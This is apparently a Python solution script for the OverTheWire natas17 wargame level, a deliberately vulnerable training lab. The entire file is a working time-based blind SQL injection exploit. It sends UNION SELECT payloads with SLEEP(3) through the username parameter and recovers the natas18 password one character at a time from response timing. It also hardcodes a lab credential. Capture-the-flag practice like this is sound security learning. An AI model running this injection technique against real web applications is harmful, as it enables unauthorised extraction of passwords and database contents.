import requests
from tqdm import tqdm
import time

url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

auth = (username, password)

def get_all_posiibilities() -> str:
    ret = [letter for letter in range(ord('A'), ord('Z') + 1)] + \
            [letter for letter in range(ord('a'), ord('z') + 1)] + \
            [num for num in range(48,58)]
    return ret


def run_queries() -> None:
    res = ""
    for i in tqdm(range(1, 35)):
        for ch in get_all_posiibilities():
            params = {'username': "natas18\" UNION SELECT username=\"natas18\" and " 
                    f"IF(binary SUBSTRING(password,{i},1)=CHAR({ch}), "
                    "sleep(3), \"false\"),\"1\" from users where \"1\"=\"1"
            }
            start = time.time()
            response = requests.get(url, params=params, auth=auth)
            elpased = time.time() - start
            
            if response.status_code == 200 and elpased > 3:
                res += chr(ch)
                break
            elif response.status_code != 200:
                print(f"status: {response.status_code}")
                raise RuntimeError("Error in query.")
    print(res)


def main():
    run_queries()


if __name__ == "__main__":
    main()
